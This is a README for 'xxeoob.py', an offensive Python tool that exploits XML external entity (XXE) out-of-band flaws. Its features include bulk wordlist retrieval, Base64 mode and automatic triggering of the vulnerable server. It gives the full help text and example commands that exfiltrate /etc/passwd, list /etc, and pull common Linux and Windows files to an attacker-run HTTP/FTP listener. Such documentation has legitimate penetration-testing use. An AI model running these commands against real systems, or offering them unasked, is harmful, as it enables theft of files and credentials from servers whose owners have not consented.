# XXE OOB Exfiltrator

## Description
This is a simple tool for exploiting XXE Out-Of-Band vulnerability to exfiltrate files content (or list directories) using a self-hosted HTTP server to deliver a DTD which links to a self-hosted simulated FTP server for exfiltrating the file content.

## Features
* External DTD inclusion by using self-hosted HTTP server
* Multi-line content exfiltration by using `ftp://` URI scheme and self-hosted simulated FTP server
* Base64 encoded content exfiltration by using `php://` URI scheme and self-hosted simulated FTP server
* Single file exfiltration (and in some cases directory listing)
* Multiple files exfiltration using a wordlist of filepaths
* Output exfiltrated content to a file
* Save exfiltrated files to a directory
* Automatically trigger exploit by sending HTTP request to vulnerable server before starting local servers for exfiltration

### Note:
The multiline content exfiltration (without Base64 encoding) will work only on environments that allow multiline URIs, for instance in some Java environments it won't work because Java doesn't allow multiline URIs since version 8. Also it won't work with binary files because bad characters will break the URI.

## Usage
To run the script you need Python 3 and the Python `requests` library.

To run in automatic mode you need a JSON requestfile that will be parsed by the script to automatically trigger the exploit. A template of the JSON requestfile is available [here](data/reqfile_template.json).

### Help
```
usage: xxeoob.py [-h] -s SERVER [-f FILE] [-fp FTP_PORT] [-hp HTTP_PORT]
                 [-o OUTFILE] [-w WORDLIST] [-r REQUESTFILE] [-b] [-d DELAY]
                 [-p PROXY]

XXE OOB file content exfiltrator via self-hosted HTTP and FTP servers

optional arguments:
  -h, --help            show this help message and exit
  -s SERVER, --server SERVER
                        This server IP/hostname
  -f FILE, --file FILE  File to retrieve in vulnerable server
  -fp FTP_PORT, --ftp-port FTP_PORT
                        FTP server port (default: 21)
  -hp HTTP_PORT, --http-port HTTP_PORT
                        HTTP server port (default: 80)
  -o OUTFILE, --outfile OUTFILE
                        Output exfiltrated content to file (or directory in
                        case of multiple files)
  -w WORDLIST, --wordlist WORDLIST
                        Wordlist containing a list of files to retrieve
  -r REQUESTFILE, --requestfile REQUESTFILE
                        Use JSON request file for automatic mode (to
                        automatically trigger the request to vulnerable
                        server)
  -b, --base64          Convert exfiltrated content from Base64
  -d DELAY, --delay DELAY
                        Delay in seconds between files exfiltrated in wordlist
                        mode (to avoid DoS)
  -p PROXY, --proxy PROXY
                        Add proxy (in format <PROT>://<IP_OR_HOSTNAME>:<PORT>)
```

### Examples
`./xxeoob.py -s 10.10.10.10 -hp 8081 -fp 2121 -f /etc/passwd`

Exfiltrate "/etc/passwd" file content

`./xxeoob.py -s 192.168.1.123 -f /etc`

List the content of the directory "/etc"

`./xxeoob.py -s 172.17.0.1 -w data/linux_commonpaths_wordlist -o exfiltrated_files -r custom_reqfile.json`

Automatically exfiltrate all common unix files and save them in "exfiltrated_files" directory

`./xxeoob.py -s 127.0.0.1 -w data/windows_commonpaths_wordlist -o exfiltrated_files -r custom_reqfile.json -b`

Automatically exfiltrate all common windows files in Base64 mode and save them in "exfiltrated_files" directory
